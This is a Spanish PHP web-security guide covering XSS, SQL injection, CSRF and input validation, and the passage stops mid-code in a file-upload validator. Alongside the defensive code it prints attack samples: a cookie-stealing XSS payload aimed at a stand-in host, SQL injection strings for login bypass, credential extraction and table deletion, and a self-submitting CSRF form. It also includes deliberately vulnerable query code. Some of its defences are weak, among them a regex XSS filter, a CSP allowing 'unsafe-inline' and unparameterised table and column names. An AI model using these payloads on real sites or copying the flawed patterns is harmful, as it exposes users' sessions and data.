# Seguridad en Formularios PHP - Guía Completa

## Índice
1. [Introducción a la Seguridad](#introducción)
2. [Protección contra XSS](#xss)
3. [Protección contra Inyección SQL](#sql-injection)
4. [Protección CSRF](#csrf)
5. [Validación y Sanitización](#validacion)
6. [Autenticación y Autorización](#autenticacion)
7. [Protección contra Fuerza Bruta](#fuerza-bruta)
8. [Seguridad en Subida de Archivos](#archivos)
9. [Headers de Seguridad](#headers)
10. [Registro y Monitoreo](#logs)
11. [Checklist de Seguridad](#checklist)

---

## 1. Introducción a la Seguridad {#introduccion}

### Principios Fundamentales

**Nunca confíes en los datos del usuario**: Todo dato que viene del cliente debe ser validado y sanitizado.

**Defensa en profundidad**: Múltiples capas de seguridad, no una sola medida.

**Principio de mínimo privilegio**: Solo los permisos necesarios.

**Fallar de forma segura**: Si algo falla, debe hacerlo de manera que no comprometa la seguridad.

### Vectores de Ataque Comunes

1. **XSS** (Cross-Site Scripting) - Inyección de JavaScript
2. **SQL Injection** - Manipulación de consultas SQL
3. **CSRF** (Cross-Site Request Forgery) - Ejecución de acciones no autorizadas
4. **Directory Traversal** - Acceso a archivos del sistema
5. **Remote Code Execution** - Ejecución de código remoto
6. **Session Hijacking** - Robo de sesiones
7. **Brute Force** - Ataques de fuerza bruta

---

## 2. Protección contra XSS (Cross-Site Scripting) {#xss}

### ¿Qué es XSS?

XSS permite a un atacante inyectar código JavaScript malicioso que se ejecuta en el navegador de otros usuarios.

### Tipos de XSS

**1. XSS Reflejado (Reflected XSS)**
```
URL maliciosa: https://sitio.com/buscar?q=<script>alert('XSS')</script>
```

**2. XSS Almacenado (Stored XSS)**
```
Usuario guarda en DB: <script>document.location='http://malicioso.com?cookie='+document.cookie</script>
```

**3. XSS Basado en DOM**
```javascript
// JavaScript vulnerable
document.getElementById('output').innerHTML = location.hash;
```

### Protección Básica

```php
<?php
/**
 * Escapar salida HTML
 * Convierte caracteres especiales en entidades HTML
 */
function escape_html($texto) {
    return htmlspecialchars($texto, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

// Uso
$nombre = $_POST['nombre'];
echo escape_html($nombre);

// Caracteres convertidos:
// < → &lt;
// > → &gt;
// " → &quot;
// ' → &#039;
// & → &amp;
?>
```

### Protección Avanzada

```php
<?php
/**
 * Clase para sanitización y validación contra XSS
 */
class SeguridadXSS {
    
    /**
     * Limpia HTML permitiendo solo etiquetas seguras
     */
    public static function limpiar_html($texto, $etiquetas_permitidas = '<p><br><strong><em><ul><ol><li>') {
        // Eliminar todas las etiquetas excepto las permitidas
        $texto = strip_tags($texto, $etiquetas_permitidas);
        
        // Limpiar atributos peligrosos
        $texto = preg_replace('/<(\w+)[^>]*?(on\w+\s*=|javascript:|data:)/i', '<$1', $texto);
        
        return $texto;
    }
    
    /**
     * Sanitiza URL
     */
    public static function limpiar_url($url) {
        // Filtrar URL
        $url = filter_var($url, FILTER_SANITIZE_URL);
        
        // Validar que sea una URL válida
        if (filter_var($url, FILTER_VALIDATE_URL) === false) {
            return '';
        }
        
        // Bloquear protocolos peligrosos
        $protocolos_permitidos = ['http', 'https'];
        $partes = parse_url($url);
        
        if (!isset($partes['scheme']) || !in_array(strtolower($partes['scheme']), $protocolos_permitidos)) {
            return '';
        }
        
        return $url;
    }
    
    /**
     * Sanitiza para usar en JavaScript
     */
    public static function escapar_js($texto) {
        return json_encode($texto, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
    }
    
    /**
     * Sanitiza para atributos HTML
     */
    public static function escapar_atributo($texto) {
        return htmlspecialchars($texto, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }
    
    /**
     * Elimina completamente todas las etiquetas HTML
     */
    public static function solo_texto($texto) {
        return strip_tags($texto);
    }
}

// === EJEMPLOS DE USO ===

// En HTML normal
$comentario = $_POST['comentario'];
echo SeguridadXSS::limpiar_html($comentario);

// En atributos HTML
$valor = $_POST['valor'];
echo '<input type="text" value="' . SeguridadXSS::escapar_atributo($valor) . '">';

// En URLs
$url = $_POST['url'];
$url_segura = SeguridadXSS::limpiar_url($url);
if ($url_segura) {
    echo '<a href="' . SeguridadXSS::escapar_atributo($url_segura) . '">Enlace</a>';
}

// En JavaScript
$nombre = $_POST['nombre'];
echo '<script>';
echo 'var nombre = ' . SeguridadXSS::escapar_js($nombre) . ';';
echo 'alert("Hola " + nombre);';
echo '</script>';

// Para texto plano sin formato
$busqueda = $_POST['busqueda'];
echo 'Resultados para: ' . SeguridadXSS::solo_texto($busqueda);
?>
```

### Content Security Policy (CSP)

```php
<?php
/**
 * Configurar headers de Content Security Policy
 */
function configurar_csp() {
    // CSP básico
    header("Content-Security-Policy: " .
        "default-src 'self'; " .
        "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; " .
        "style-src 'self' 'unsafe-inline'; " .
        "img-src 'self' data: https:; " .
        "font-src 'self' data:; " .
        "connect-src 'self'; " .
        "frame-ancestors 'none'; " .
        "base-uri 'self'; " .
        "form-action 'self';"
    );
}

// Llamar al inicio del script
configurar_csp();
?>
```

### Prevención en el Cliente

```html
<!-- Usar textContent en lugar de innerHTML -->
<script>
// ❌ Vulnerable
document.getElementById('output').innerHTML = userInput;

// ✅ Seguro
document.getElementById('output').textContent = userInput;

// Si necesitas HTML, sanitiza primero
function sanitizeHTML(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
</script>
```

---

## 3. Protección contra Inyección SQL {#sql-injection}

### ¿Qué es la Inyección SQL?

Permite a un atacante manipular consultas SQL para acceder, modificar o eliminar datos no autorizados.

### Ejemplos de Ataques

```sql
-- Ejemplo 1: Bypass de autenticación
Usuario: admin' OR '1'='1
Contraseña: cualquiera
Query resultante: SELECT * FROM usuarios WHERE usuario='admin' OR '1'='1' AND password='...'

-- Ejemplo 2: Extracción de datos
ID: 1 UNION SELECT username, password FROM usuarios--
Query: SELECT * FROM productos WHERE id=1 UNION SELECT username, password FROM usuarios--

-- Ejemplo 3: Eliminación de tablas
ID: 1; DROP TABLE usuarios--
Query: SELECT * FROM productos WHERE id=1; DROP TABLE usuarios--
```

### NUNCA Hacer Esto

```php
<?php
// ❌❌❌ EXTREMADAMENTE PELIGROSO ❌❌❌
$usuario = $_POST['usuario'];
$password = $_POST['password'];

// Vulnerable a SQL Injection
$query = "SELECT * FROM usuarios WHERE usuario='$usuario' AND password='$password'";
$result = mysqli_query($conn, $query);

// También vulnerable
$id = $_GET['id'];
$query = "SELECT * FROM productos WHERE id=$id";

// Vulnerable con concatenación
$busqueda = $_POST['busqueda'];
$query = "SELECT * FROM articulos WHERE titulo LIKE '%$busqueda%'";
?>
```

### Método 1: PDO con Prepared Statements (RECOMENDADO)

```php
<?php
/**
 * Clase de base de datos segura con PDO
 */
class BaseDatosSegura {
    private $pdo;
    
    public function __construct($host, $dbname, $usuario, $password) {
        try {
            $dsn = "mysql:host=$host;dbname=$dbname;charset=utf8mb4";
            
            $opciones = [
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                PDO::ATTR_EMULATE_PREPARES => false, // Importante para seguridad
                PDO::ATTR_PERSISTENT => false
            ];
            
            $this->pdo = new PDO($dsn, $usuario, $password, $opciones);
            
        } catch (PDOException $e) {
            error_log("Error de conexión: " . $e->getMessage());
            die("Error de conexión a la base de datos");
        }
    }
    
    /**
     * INSERT - Insertar registro
     */
    public function insertar($tabla, $datos) {
        $campos = array_keys($datos);
        $valores = array_values($datos);
        
        $placeholders = implode(', ', array_fill(0, count($campos), '?'));
        $campos_str = implode(', ', $campos);
        
        $sql = "INSERT INTO $tabla ($campos_str) VALUES ($placeholders)";
        
        try {
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute($valores);
            return $this->pdo->lastInsertId();
        } catch (PDOException $e) {
            error_log("Error INSERT: " . $e->getMessage());
            return false;
        }
    }
    
    /**
     * SELECT - Obtener registros
     */
    public function seleccionar($tabla, $condiciones = [], $campos = '*') {
        $sql = "SELECT $campos FROM $tabla";
        $valores = [];
        
        if (!empty($condiciones)) {
            $where = [];
            foreach ($condiciones as $campo => $valor) {
                $where[] = "$campo = ?";
                $valores[] = $valor;
            }
            $sql .= " WHERE " . implode(' AND ', $where);
        }
        
        try {
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute($valores);
            return $stmt->fetchAll();
        } catch (PDOException $e) {
            error_log("Error SELECT: " . $e->getMessage());
            return [];
        }
    }
    
    /**
     * UPDATE - Actualizar registros
     */
    public function actualizar($tabla, $datos, $condiciones) {
        $set = [];
        $valores = [];
        
        foreach ($datos as $campo => $valor) {
            $set[] = "$campo = ?";
            $valores[] = $valor;
        }
        
        $where = [];
        foreach ($condiciones as $campo => $valor) {
            $where[] = "$campo = ?";
            $valores[] = $valor;
        }
        
        $sql = "UPDATE $tabla SET " . implode(', ', $set) . " WHERE " . implode(' AND ', $where);
        
        try {
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute($valores);
            return $stmt->rowCount();
        } catch (PDOException $e) {
            error_log("Error UPDATE: " . $e->getMessage());
            return false;
        }
    }
    
    /**
     * DELETE - Eliminar registros
     */
    public function eliminar($tabla, $condiciones) {
        $where = [];
        $valores = [];
        
        foreach ($condiciones as $campo => $valor) {
            $where[] = "$campo = ?";
            $valores[] = $valor;
        }
        
        $sql = "DELETE FROM $tabla WHERE " . implode(' AND ', $where);
        
        try {
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute($valores);
            return $stmt->rowCount();
        } catch (PDOException $e) {
            error_log("Error DELETE: " . $e->getMessage());
            return false;
        }
    }
    
    /**
     * Query personalizado con prepared statements
     */
    public function query($sql, $parametros = []) {
        try {
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute($parametros);
            return $stmt->fetchAll();
        } catch (PDOException $e) {
            error_log("Error QUERY: " . $e->getMessage());
            return [];
        }
    }
}

// === EJEMPLOS DE USO ===

$db = new BaseDatosSegura('localhost', 'mibase', 'usuario', 'password');

// INSERT
$nuevo_id = $db->insertar('usuarios', [
    'nombre' => $_POST['nombre'],
    'email' => $_POST['email'],
    'edad' => $_POST['edad']
]);

// SELECT
$usuarios = $db->seleccionar('usuarios', [
    'edad' => 25,
    'activo' => 1
]);

// SELECT con query personalizado
$resultados = $db->query(
    "SELECT * FROM usuarios WHERE edad > ? AND ciudad = ?",
    [18, 'Madrid']
);

// UPDATE
$filas_actualizadas = $db->actualizar(
    'usuarios',
    ['nombre' => $_POST['nombre'], 'email' => $_POST['email']],
    ['id' => $_POST['id']]
);

// DELETE
$filas_eliminadas = $db->eliminar('usuarios', ['id' => $_POST['id']]);
?>
```

### Método 2: MySQLi con Prepared Statements

```php
<?php
/**
 * Clase de base de datos segura con MySQLi
 */
class BaseDatosMySQL {
    private $mysqli;
    
    public function __construct($host, $usuario, $password, $dbname) {
        $this->mysqli = new mysqli($host, $usuario, $password, $dbname);
        
        if ($this->mysqli->connect_error) {
            error_log("Error de conexión: " . $this->mysqli->connect_error);
            die("Error de conexión");
        }
        
        // Establecer charset
        $this->mysqli->set_charset("utf8mb4");
    }
    
    /**
     * INSERT con prepared statement
     */
    public function insertar($nombre, $email, $edad) {
        $sql = "INSERT INTO usuarios (nombre, email, edad) VALUES (?, ?, ?)";
        $stmt = $this->mysqli->prepare($sql);
        
        if (!$stmt) {
            error_log("Error prepare: " . $this->mysqli->error);
            return false;
        }
        
        // s = string, i = integer, d = double, b = blob
        $stmt->bind_param("ssi", $nombre, $email, $edad);
        
        $resultado = $stmt->execute();
        $id = $stmt->insert_id;
        
        $stmt->close();
        
        return $resultado ? $id : false;
    }
    
    /**
     * SELECT con prepared statement
     */
    public function obtenerUsuario($id) {
        $sql = "SELECT id, nombre, email, edad FROM usuarios WHERE id = ?";
        $stmt = $this->mysqli->prepare($sql);
        
        if (!$stmt) {
            return null;
        }
        
        $stmt->bind_param("i", $id);
        $stmt->execute();
        
        // Vincular resultados
        $stmt->bind_result($id, $nombre, $email, $edad);
        
        $usuario = null;
        if ($stmt->fetch()) {
            $usuario = [
                'id' => $id,
                'nombre' => $nombre,
                'email' => $email,
                'edad' => $edad
            ];
        }
        
        $stmt->close();
        return $usuario;
    }
    
    /**
     * SELECT múltiple
     */
    public function buscarUsuarios($busqueda) {
        $sql = "SELECT id, nombre, email FROM usuarios WHERE nombre LIKE ? OR email LIKE ?";
        $stmt = $this->mysqli->prepare($sql);
        
        $busqueda_param = "%$busqueda%";
        $stmt->bind_param("ss", $busqueda_param, $busqueda_param);
        $stmt->execute();
        
        $resultado = $stmt->get_result();
        $usuarios = [];
        
        while ($fila = $resultado->fetch_assoc()) {
            $usuarios[] = $fila;
        }
        
        $stmt->close();
        return $usuarios;
    }
    
    /**
     * UPDATE con prepared statement
     */
    public function actualizar($id, $nombre, $email) {
        $sql = "UPDATE usuarios SET nombre = ?, email = ? WHERE id = ?";
        $stmt = $this->mysqli->prepare($sql);
        
        $stmt->bind_param("ssi", $nombre, $email, $id);
        $resultado = $stmt->execute();
        $filas = $stmt->affected_rows;
        
        $stmt->close();
        return $filas;
    }
    
    /**
     * DELETE con prepared statement
     */
    public function eliminar($id) {
        $sql = "DELETE FROM usuarios WHERE id = ?";
        $stmt = $this->mysqli->prepare($sql);
        
        $stmt->bind_param("i", $id);
        $resultado = $stmt->execute();
        $filas = $stmt->affected_rows;
        
        $stmt->close();
        return $filas;
    }
    
    public function __destruct() {
        $this->mysqli->close();
    }
}

// === EJEMPLO DE USO ===

$db = new BaseDatosMySQL('localhost', 'usuario', 'password', 'mibase');

// Insertar
$nuevo_id = $db->insertar($_POST['nombre'], $_POST['email'], $_POST['edad']);

// Obtener
$usuario = $db->obtenerUsuario($_GET['id']);

// Buscar
$resultados = $db->buscarUsuarios($_GET['q']);

// Actualizar
$db->actualizar($_POST['id'], $_POST['nombre'], $_POST['email']);

// Eliminar
$db->eliminar($_POST['id']);
?>
```

### Protección Adicional: Escapado (Último Recurso)

```php
<?php
// ⚠️ Solo si NO puedes usar prepared statements

$mysqli = new mysqli("localhost", "usuario", "password", "base");

$nombre = $mysqli->real_escape_string($_POST['nombre']);
$email = $mysqli->real_escape_string($_POST['email']);

$query = "INSERT INTO usuarios (nombre, email) VALUES ('$nombre', '$email')";
$mysqli->query($query);

// Nota: Prepared statements son SIEMPRE mejores
?>
```

### Validación de Tipos

```php
<?php
/**
 * Validar que los datos sean del tipo esperado
 */

// Validar entero
$id = filter_input(INPUT_POST, 'id', FILTER_VALIDATE_INT);
if ($id === false || $id === null) {
    die("ID inválido");
}

// Validar email
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
if ($email === false) {
    die("Email inválido");
}

// Validar rango numérico
$edad = filter_input(INPUT_POST, 'edad', FILTER_VALIDATE_INT, [
    'options' => ['min_range' => 0, 'max_range' => 120]
]);

// Solo entonces usar en la query
$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE id = ?");
$stmt->execute([$id]);
?>
```

---

## 4. Protección CSRF (Cross-Site Request Forgery) {#csrf}

### ¿Qué es CSRF?

CSRF fuerza a un usuario autenticado a ejecutar acciones no deseadas en una aplicación web.

### Ejemplo de Ataque

```html
<!-- Página maliciosa -->
<img src="https://banco.com/transferir?destino=atacante&monto=1000">

<!-- Formulario oculto que se auto-envía -->
<form action="https://tusitio.com/eliminar-cuenta" method="POST" id="csrf">
    <input type="hidden" name="confirmar" value="si">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### Implementación Completa de Protección CSRF

```php
<?php
/**
 * Clase para manejo de tokens CSRF
 */
class ProteccionCSRF {
    
    /**
     * Genera un token CSRF y lo guarda en la sesión
     */
    public static function generar_token() {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        
        // Generar token aleatorio seguro de 32 bytes (64 caracteres hex)
        $token = bin2hex(random_bytes(32));
        
        // Guardar en sesión con timestamp
        $_SESSION['csrf_token'] = $token;
        $_SESSION['csrf_token_time'] = time();
        
        return $token;
    }
    
    /**
     * Obtiene el token actual (lo genera si no existe)
     */
    public static function obtener_token() {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        
        if (!isset($_SESSION['csrf_token'])) {
            return self::generar_token();
        }
        
        return $_SESSION['csrf_token'];
    }
    
    /**
     * Verifica que el token sea válido
     */
    public static function verificar_token($token, $tiempo_expiracion = 3600) {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        
        // Verificar que exista el token en sesión
        if (!isset($_SESSION['csrf_token'])) {
            return false;
        }
        
        // Verificar expiración (opcional, por defecto 1 hora)
        if (isset($_SESSION['csrf_token_time'])) {
            $tiempo_transcurrido = time() - $_SESSION['csrf_token_time'];
            if ($tiempo_transcurrido > $tiempo_expiracion) {
                self::generar_token(); // Regenerar token expirado
                return false;
            }
        }
        
        // Comparación segura contra timing attacks
        $es_valido = hash_equals($_SESSION['csrf_token'], $token);
        
        // Regenerar token después de uso (patrón one-time token)
        if ($es_valido) {
            self::generar_token();
        }
        
        return $es_valido;
    }
    
    /**
     * Genera el campo HTML hidden para el formulario
     */
    public static function campo_formulario() {
        $token = self::obtener_token();
        return '<input type="hidden" name="csrf_token" value="' . htmlspecialchars($token, ENT_QUOTES, 'UTF-8') . '">';
    }
    
    /**
     * Verifica el token del formulario enviado
     */
    public static function verificar_formulario() {
        if (!isset($_POST['csrf_token'])) {
            return false;
        }
        
        return self::verificar_token($_POST['csrf_token']);
    }
    
    /**
     * Middleware para proteger rutas
     */
    public static function proteger() {
        if ($_SERVER['REQUEST_METHOD'] !== 'GET' && !self::verificar_formulario()) {
            http_response_code(403);
            die('Token CSRF inválido o expirado. Por favor, recarga la página e intenta de nuevo.');
        }
    }
}

// === EJEMPLO 1: Formulario Básico ===
?>
<!DOCTYPE html>
<html>
<head>
    <title>Formulario Protegido</title>
</head>
<body>
    <form method="POST" action="procesar.php">
        <?php echo ProteccionCSRF::campo_formulario(); ?>
        
        <label>Nombre:</label>
        <input type="text" name="nombre" required>
        
        <label>Email:</label>
        <input type="email" name="email" required>
        
        <button type="submit">Enviar</button>
    </form>
</body>
</html>

<?php
// === EJEMPLO 2: Procesar Formulario ===
// archivo: procesar.php

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Verificar token CSRF
    if (!ProteccionCSRF::verificar_formulario()) {
        http_response_code(403);
        die('Error: Token CSRF inválido');
    }
    
    // Token válido, procesar datos
    $nombre = $_POST['nombre'];
    $email = $_POST['email'];
    
    // ... procesar datos de forma segura
    
    echo "Formulario procesado correctamente";
}

// === EJEMPLO 3: Protección Automática ===
// Usar al inicio de scripts que modifican datos

session_start();

// Proteger automáticamente cualquier petición POST/PUT/DELETE
ProteccionCSRF::proteger();

// Si llega aquí, el token es válido
// ... resto del código

// === EJEMPLO 4: AJAX con CSRF ===
?>
<script>
// Obtener token del meta tag o campo hidden
const csrfToken = document.querySelector('input[name="csrf_token"]').value;

// Enviar con fetch
fetch('/api/guardar', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({
        nombre: 'Juan',
        email: 'juan@email.com'
    })
});

// O con FormData
const formData = new FormData();
formData.append('csrf_token', csrfToken);
formData.append('nombre', 'Juan');

fetch('/api/guardar', {
    method: 'POST',
    body: formData
});
</script>

<?php
// Verificar token en API
// api/guardar.php

session_start();

$token = $_SERVER['HTTP_X_CSRF_TOKEN'] ?? $_POST['csrf_token'] ?? null;

if (!ProteccionCSRF::verificar_token($token)) {
    http_response_code(403);
    echo json_encode(['error' => 'Token CSRF inválido']);
    exit;
}

// Procesar petición API
?>
```

### Alternativa: SameSite Cookies

```php
<?php
/**
 * Configurar cookies con SameSite
 */
session_start([
    'cookie_lifetime' => 3600,
    'cookie_secure' => true,      // Solo HTTPS
    'cookie_httponly' => true,     // No accesible desde JavaScript
    'cookie_samesite' => 'Strict'  // Protección CSRF
]);

// Para cookies personalizadas
setcookie('auth_token', $token, [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => '',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'  // o 'Lax' o 'None'
]);
?>
```

### Double Submit Cookie Pattern

```php
<?php
/**
 * Patrón Double Submit Cookie (alternativa)
 */
class CSRFDoubleSubmit {
    
    public static function generar() {
        $token = bin2hex(random_bytes(32));
        
        // Guardar en cookie
        setcookie('csrf_cookie', $token, [
            'expires' => time() + 3600,
            'path' => '/',
            'secure' => true,
            'httponly' => false,  // Debe ser accesible por JavaScript
            'samesite' => 'Strict'
        ]);
        
        return $token;
    }
    
    public static function verificar($token) {
        if (!isset($_COOKIE['csrf_cookie'])) {
            return false;
        }
        
        return hash_equals($_COOKIE['csrf_cookie'], $token);
    }
}

// Uso en formulario
$token = CSRFDoubleSubmit::generar();
echo '<input type="hidden" name="csrf_token" value="' . $token . '">';

// Verificar
if (!CSRFDoubleSubmit::verificar($_POST['csrf_token'])) {
    die('Token inválido');
}
?>
```

---

## 5. Validación y Sanitización Avanzada {#validacion}

### Diferencia entre Validación y Sanitización

- **Validación**: Verificar que los datos cumplan los requisitos
- **Sanitización**: Limpiar/transformar datos para hacerlos seguros

```php
<?php
/**
 * Clase completa de validación y sanitización
 */
class ValidadorSeguro {
    
    private $errores = [];
    private $datos = [];
    
    /**
     * Agregar error
     */
    private function agregar_error($campo, $mensaje) {
        $this->errores[$campo][] = $mensaje;
    }
    
    /**
     * Validar campo requerido
     */
    public function requerido($campo, $valor, $mensaje = null) {
        if (empty($valor) && $valor !== '0') {
            $mensaje = $mensaje ?? "El campo $campo es obligatorio";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar email
     */
    public function email($campo, $valor, $mensaje = null) {
        if (!filter_var($valor, FILTER_VALIDATE_EMAIL)) {
            $mensaje = $mensaje ?? "El email no es válido";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar URL
     */
    public function url($campo, $valor, $mensaje = null) {
        if (!filter_var($valor, FILTER_VALIDATE_URL)) {
            $mensaje = $mensaje ?? "La URL no es válida";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar longitud mínima
     */
    public function min_longitud($campo, $valor, $min, $mensaje = null) {
        if (strlen($valor) < $min) {
            $mensaje = $mensaje ?? "El campo $campo debe tener al menos $min caracteres";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar longitud máxima
     */
    public function max_longitud($campo, $valor, $max, $mensaje = null) {
        if (strlen($valor) > $max) {
            $mensaje = $mensaje ?? "El campo $campo no puede tener más de $max caracteres";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar rango numérico
     */
    public function rango($campo, $valor, $min, $max, $mensaje = null) {
        if (!is_numeric($valor) || $valor < $min || $valor > $max) {
            $mensaje = $mensaje ?? "El campo $campo debe estar entre $min y $max";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar patrón regex
     */
    public function patron($campo, $valor, $patron, $mensaje = null) {
        if (!preg_match($patron, $valor)) {
            $mensaje = $mensaje ?? "El campo $campo no tiene el formato correcto";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar que sea entero
     */
    public function entero($campo, $valor, $mensaje = null) {
        if (!filter_var($valor, FILTER_VALIDATE_INT)) {
            $mensaje = $mensaje ?? "El campo $campo debe ser un número entero";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar que sea decimal
     */
    public function decimal($campo, $valor, $mensaje = null) {
        if (!filter_var($valor, FILTER_VALIDATE_FLOAT)) {
            $mensaje = $mensaje ?? "El campo $campo debe ser un número decimal";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar fecha
     */
    public function fecha($campo, $valor, $formato = 'Y-m-d', $mensaje = null) {
        $fecha = DateTime::createFromFormat($formato, $valor);
        if (!$fecha || $fecha->format($formato) !== $valor) {
            $mensaje = $mensaje ?? "El campo $campo debe ser una fecha válida";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar que esté en una lista
     */
    public function en_lista($campo, $valor, $lista, $mensaje = null) {
        if (!in_array($valor, $lista, true)) {
            $mensaje = $mensaje ?? "El valor de $campo no es válido";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar contraseña segura
     */
    public function password_seguro($campo, $valor, $mensaje = null) {
        // Al menos 8 caracteres, 1 mayúscula, 1 minúscula, 1 número
        $patron = '/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$/';
        
        if (!preg_match($patron, $valor)) {
            $mensaje = $mensaje ?? "La contraseña debe tener al menos 8 caracteres, una mayúscula, una minúscula y un número";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar teléfono
     */
    public function telefono($campo, $valor, $mensaje = null) {
        $patron = '/^[+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{1,9}$/';
        
        if (!preg_match($patron, $valor)) {
            $mensaje = $mensaje ?? "El teléfono no es válido";
            $this->agregar_error($campo, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Validar que dos campos coincidan
     */
    public function coincide($campo1, $valor1, $campo2, $valor2, $mensaje = null) {
        if ($valor1 !== $valor2) {
            $mensaje = $mensaje ?? "Los campos $campo1 y $campo2 no coinciden";
            $this->agregar_error($campo1, $mensaje);
            return false;
        }
        return true;
    }
    
    /**
     * Sanitizar string (texto)
     */
    public function sanitizar_string($valor) {
        return htmlspecialchars(trim($valor), ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }
    
    /**
     * Sanitizar email
     */
    public function sanitizar_email($valor) {
        return filter_var(trim($valor), FILTER_SANITIZE_EMAIL);
    }
    
    /**
     * Sanitizar entero
     */
    public function sanitizar_entero($valor) {
        return filter_var($valor, FILTER_SANITIZE_NUMBER_INT);
    }
    
    /**
     * Sanitizar decimal
     */
    public function sanitizar_decimal($valor) {
        return filter_var($valor, FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION);
    }
    
    /**
     * Obtener errores
     */
    public function obtener_errores() {
        return $this->errores;
    }
    
    /**
     * Verificar si hay errores
     */
    public function tiene_errores() {
        return !empty($this->errores);
    }
    
    /**
     * Limpiar errores
     */
    public function limpiar_errores() {
        $this->errores = [];
    }
}

// === EJEMPLO COMPLETO DE USO ===

$validador = new ValidadorSeguro();

// Capturar datos
$nombre = $_POST['nombre'] ?? '';
$email = $_POST['email'] ?? '';
$edad = $_POST['edad'] ?? '';
$telefono = $_POST['telefono'] ?? '';
$password = $_POST['password'] ?? '';
$password_confirmar = $_POST['password_confirmar'] ?? '';
$genero = $_POST['genero'] ?? '';
$fecha_nacimiento = $_POST['fecha_nacimiento'] ?? '';

// Validaciones
$validador->requerido('nombre', $nombre);
$validador->min_longitud('nombre', $nombre, 3);
$validador->max_longitud('nombre', $nombre, 50);

$validador->requerido('email', $email);
$validador->email('email', $email);

$validador->requerido('edad', $edad);
$validador->entero('edad', $edad);
$validador->rango('edad', $edad, 18, 100);

$validador->telefono('telefono', $telefono);

$validador->requerido('password', $password);
$validador->password_seguro('password', $password);
$validador->coincide('password', $password, 'password_confirmar', $password_confirmar);

$validador->en_lista('genero', $genero, ['M', 'F', 'Otro']);

$validador->fecha('fecha_nacimiento', $fecha_nacimiento);

// Verificar errores
if ($validador->tiene_errores()) {
    $errores = $validador->obtener_errores();
    
    foreach ($errores as $campo => $mensajes) {
        foreach ($mensajes as $mensaje) {
            echo "<p class='error'>$mensaje</p>";
        }
    }
} else {
    // Sanitizar datos
    $nombre_limpio = $validador->sanitizar_string($nombre);
    $email_limpio = $validador->sanitizar_email($email);
    $edad_limpia = $validador->sanitizar_entero($edad);
    
    // Procesar datos seguros
    echo "Datos válidos y sanitizados";
}
?>
```

### Validación de Archivos

```php
<?php
/**
 * Clase para validación segura de archivos
 */
class ValidadorArchivos {
    
    private $errores = [];
    
    /**
     * Validar archivo subido
     */
    public function validar($archivo, $opciones = []) {
        // Opciones por defecto
        $config = array_merge([
            'tamano_max' => 5242880, // 5MB
            'extensiones_permitidas' => ['jpg', 'jpeg', 'png', 'pdf'],
            'mime_types_permitidos' => ['image/jpeg', 'image/png', 'application/pdf'],
            'requerir_imagen' => false
        ], $opciones);
        
        // Verificar que se subió un archivo
        if (!isset($archivo['error']) || is_array($archivo['error'])) {
            $this->errores[] = "Parámetros de archivo inválidos";
            return false;
        }
        
        // Verificar errores de subida
        switch ($archivo['error']) {
            case UPLOAD_ERR_OK:
                break;
            case UPLOAD_ERR_NO_FILE:
                $this->errores[] = "No se seleccionó ningún archivo";
                return false;
            case UPLOAD_ERR_INI_SIZE:
            case UPLOAD_ERR_FORM_SIZE:
                $this->errores[] = "El archivo excede el tamaño permitido";
                return false;
            default:
                $this->errores[] = "Error desconocido al subir el archivo";
                return false;
        }
        
        // Validar tamaño
        if ($archivo['size'] > $config['tamano_max']) {
            $mb = round($config['tamano_max'] / 1048576, 2);
            $this->errores[] = "El archivo no puede superar $mb MB";
            return false;
        }
        
        // Validar extensión
        $extension = strtolower(pathinfo($archivo['name'], PATHINFO_EXTENSION));
        if (!in_array($extension, $config['extensiones_permitidas'])) {
            $permitidas = implode(', ', $config['extensiones_permitidas']);
            $this->errores[] = "Solo se permiten archivos: $permitidas";
            return false;
        }
        
        // Validar MIME type real
        $finfo = new finfo(FILEINFO_MIME_TYPE);
